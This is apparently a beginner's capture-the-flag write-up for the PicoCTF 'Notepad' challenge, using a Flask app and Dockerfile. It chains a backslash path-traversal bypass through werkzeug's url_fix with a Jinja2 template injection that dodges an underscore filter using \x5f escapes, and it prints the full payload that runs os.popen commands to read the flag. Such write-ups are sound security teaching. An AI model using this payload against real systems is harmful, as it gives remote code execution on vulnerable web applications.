This is my first ever writeup so bare with me haha.

Notepad is a hard level PicoCTF challenge. It's relatively small at least code wise containing an app.py file that is just 22 lines of python, and here they are:

'''
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    print(content)
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
'''


Before anything I want to know where the flag will be stored on the docker container, heres the Dockerfile:

'''
# Dockerfile (fixed & pinned for lab testing)
FROM python:3.9.2-slim-buster

# Ensure deterministic output from python processes in containers
ENV PYTHONUNBUFFERED=1

WORKDIR /app

# Install specific (older) versions intentionally:
# - Flask 2.0.3 (compatible with Werkzeug 2.0.x)
# - Werkzeug 2.0.3 (contains url_fix)
# - pin gunicorn to a modern-but-known version
RUN pip install --no-cache-dir "Flask==2.0.3" "werkzeug==2.0.3" "gunicorn==20.1.0"

# Copy app + assets
COPY app.py flag.txt ./
COPY templates templates

# Make sure required dirs exist, set permissions, and rename the flag file to a random name
RUN mkdir -p /app/static /app/templates/errors && \
    chmod -R 775 /app && \
    chmod 1773 /app/static /app/templates/errors && \
    # only rename if flag.txt exists
    if [ -f flag.txt ]; then mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt; fi

# Expose a port (optional, but useful)
EXPOSE 8000

# Fix gunicorn CLI flags: use --user and --group properly and bind to port 8000
CMD ["gunicorn", "-w", "16", "-t", "5", "--graceful-timeout", "0", "--user", "nobody", "--group", "nogroup", "-b", "0.0.0.0:8000", "app:app"]

'''

As you can see from 'COPY app.py flag.txt ./' the flag will just be a file in the root directory. From this I assumed this may be an LFI challenge or RCE.


Now, Diving into te code it has some interesting behaviour. The code is made to save notes into a directory static as a .html file, it also saves the file as the first 128 characters of the note along with 8 random characters in the end.
Immediately I attempted a directory traversal as the name of the file is being generated and then passed onto pythons open() function, which takes a filename that can include ../ ... interesting.

Now theres an issue, two characters are filtered out from the notes, that being forward slash '/' and underscores '_'. The underscores will make sense later.
I wanted to see if I could find a way around the filtering and so I looked up the url_fix function from werkzeug. Heres the function:

'''
from werkzeug.urls import url_fix

def url_fix_source(s, charset='utf-8'):
    r"""Sometimes you get an URL by a user that just isn't a real URL because
    it contains unsafe characters like ' ' and so on. This function can fix
    some of the problems in a similar way browsers handle data entered by the
    user:

    >>> url_fix(u'http://de.wikipedia.org/wiki/Elf (Begriffskl\xe4rung)')
    'http://de.wikipedia.org/wiki/Elf%20(Begriffskl%C3%A4rung)'

    :param s: the string with the URL to fix.
    :param charset: The target charset for the URL if the url was given as
                    unicode string.
    """
    # First step is to switch to unicode processing and to convert
    # backslashes (which are invalid in URLs anyways) to slashes.  This is
    # consistent with what Chrome does.
    s = to_unicode(s, charset, 'replace').replace('\\', '/')

    # For the specific case that we look like a malformed windows URL
    # we want to fix this up manually:
    if s.startswith('file://') and s[7:8].isalpha() and s[8:10] in (':/', '|/'):
        s = 'file:///' + s[7:]

    url = url_parse(s)
    path = url_quote(url.path, charset, safe='/%+$!*\'(),')
    qs = url_quote_plus(url.query, charset, safe=':&%=+$!*\'(),')
    anchor = url_quote_plus(url.fragment, charset, safe=':&%=+$!*\'(),')
    return to_native(url_unparse((url.scheme, url.encode_netloc(),
                                  path, qs, anchor)))

'''

Something really interesting here is that url_fix converts backslashes to forwardslashes... :)

This was a clear way to bypass the forwardslash filter. 
Now, submitting a note with content '..\test' will write files to the apps main directory. I tested this in a docker file and it worked.
Something I shouldve mentioned earlier is that the app can accept error templates when the notepad exceeds 512 characters of contains bad characters.
The templates are stored in the templates directory within the apps main directory. 
Templates are passed straing into python, interestingly they can execute python code inside curly braces. At this point I was sure this was a SSTI (Server Side Template Injection).
Using the previous directory traversal vulnerability, I am able to place files in the templates/errors directory, which is exactly where python pulls errors from.
Now, to execute the SSTI vulnerability I had to supply 128 random characters to not mess up the name (not entirely sure if this was required but it's more stable).
Here was my original note I submitted as a test:

..\templates\errors\expxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx{{ print ('ello?')}}

after submitting this note, the server placed a file with the name 'expxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx-TYTVPd8HE3I.html' in the errors directory.
I could then access this file by passing an error parameter with the name of that file to the front page as so:

[ ADD IMAGE HERE ]

Now, I need to be able to execute system commands, I could just read files but thats boring. Using the regular SSTI oneliner does not work because of the previously mentioned underscore '_' filtering, so we have to get creative.
Using pythons 'attr' function. The only issue is we cant get by with just attr, this is because certain objects have underscores no matter what way you access it. For this we can use the byte representation of underscores in python: \x5f. 
Now, we can get to the __builtins__ object in python which houses __getitem__ which from there you can get to my beloved import function and import os.popen. With this, we have SSTI :D. Heres the full payload:

..\templates\errors\expxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

for simplicity the SSTI payload is:
request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()

Now you can easily find a payload just like this online or an alternative but doing it myself is more fun and you learn more.
Anyways, after submitting this payload, you can just access it and run system commands, I switch out 'ls' to 'cat /flag.txt' and you can read the flag as so:

[ ADD IMAGE HERE ]

You could also run any command you'd like of course.
